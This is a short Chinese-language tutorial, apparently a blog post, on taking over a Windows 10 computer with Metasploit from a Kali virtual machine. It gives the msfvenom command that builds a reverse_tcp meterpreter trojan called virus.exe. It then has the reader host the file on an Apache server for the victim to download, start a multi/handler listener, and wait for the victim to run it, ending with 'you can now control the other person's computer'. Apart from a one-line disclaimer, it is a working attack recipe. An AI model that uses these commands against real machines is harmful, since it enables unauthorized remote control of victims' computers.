# msf渗透木马win10
### 此教程仅供学习!造成的损失与作者无关!
最近不知道树莓派放到哪去了,于是买了个固态硬盘装kali虚拟机,之前如果有看过我RPI装Kali的也不用慌,把第2步打开命令行改成连接树莓派就行<br/>

1. 把虚拟机的的连接方式改成桥接,但不要勾选复制物理连接[![H1sUXR.png](https://s4.ax1x.com/2022/02/08/H1sUXR.png)](https://imgtu.com/i/H1sUXR)<br/>
2. 打开控制台<br/>
3. 查看攻击方的IP[![H1rlJe.png](https://s4.ax1x.com/2022/02/08/H1rlJe.png)](https://imgtu.com/i/H1rlJe)<br/>
4. 生成木马,命令:msfvenom -p windows/meterpreter/reverse_tcp lhost=攻击方的IP lport=4444 -f exe -a x86 >virus.exe (记得加上sudo,如果是root就不用)[![H16YLR.png](https://s4.ax1x.com/2022/02/08/H16YLR.png)](https://imgtu.com/i/H16YLR)<br/>
5. 安装apache2,把木马移动到/var/www/html目录下,开启apache2服务[![H1cNcQ.png](https://s4.ax1x.com/2022/02/08/H1cNcQ.png)](https://imgtu.com/i/H1cNcQ)<br/>
6. 打开msf(命令msfconsole),加载模块use exploit/multi/handler[![H1WORf.md.png](https://s4.ax1x.com/2022/02/08/H1WORf.md.png)](https://imgtu.com/i/H1WORf)<br/>
7. 设置监听IP和监听端口,ip就是第三步获取的ip,端口就是4444(前提是生成木马时的端口是4444,但是提供的木马生成命令设置端口就是4444)[![H1f0Yt.png](https://s4.ax1x.com/2022/02/08/H1f0Yt.png)](https://imgtu.com/i/H1f0Yt)<br/>
8. 输入set payload windows/meterpreter/reverse_tcp<br/>
8. 输入exploit,开始监听[![H1oTeS.png](https://s4.ax1x.com/2022/02/08/H1oTeS.png)](https://imgtu.com/i/H1oTeS)<br/>
6. 在被攻击方运行木马,通常,它在{攻击方IP地址/生成病毒名称,如果没有重命名的话,应该叫virus.exe}<br/>
7. 这时,你拿到了权限,可以控制对方电脑啦~~~
